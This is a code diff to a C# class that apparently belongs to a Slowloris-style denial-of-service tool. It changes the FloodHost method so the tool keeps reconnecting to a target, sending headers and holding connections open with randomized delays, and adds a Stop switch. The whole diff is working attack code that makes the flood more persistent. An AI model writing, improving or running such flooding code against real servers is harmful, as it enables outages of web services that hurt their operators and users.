@@ -9,6 +9,8 @@ internal class LimitedHttpConnection
     private Socket? socket;
     private ThrottledNetworkStream? stream;
 
+    private bool _isFlooding = true;
+
     public LimitedHttpConnection(TargetInfo target)
     {
         _target = target;
@@ -17,7 +19,7 @@ internal class LimitedHttpConnection
     private async Task WriteAsync(string format, params object[] args)
     {
         byte[] buffer = Encoding.UTF8.GetBytes(string.Format(format, args));
-        await stream.WriteAsync(buffer);
+        await stream!.WriteAsync(buffer);
     }
 
     private async Task ConnectAsync()
@@ -49,13 +51,23 @@ internal class LimitedHttpConnection
 
     public async Task FloodHost()
     {
-        await ConnectAsync();
-        await SendHeadersAsync();
-        while (socket is not null && socket.Connected)
+        _isFlooding = true;
+        while (_isFlooding)
         {
-            await KeepAliveAsync();
+            await ConnectAsync();
+            await SendHeadersAsync();
+            while (socket is not null && socket.Connected)
+            {
+                await KeepAliveAsync();
+                await Task.Delay(new Random().Next(0, 500));
+            }
         }
-        stream.CloseAndDispose();
+        stream?.CloseAndDispose();
         socket = null;
+    }
+
+    public void Stop()
+    {
+        _isFlooding = false;
     }
 }
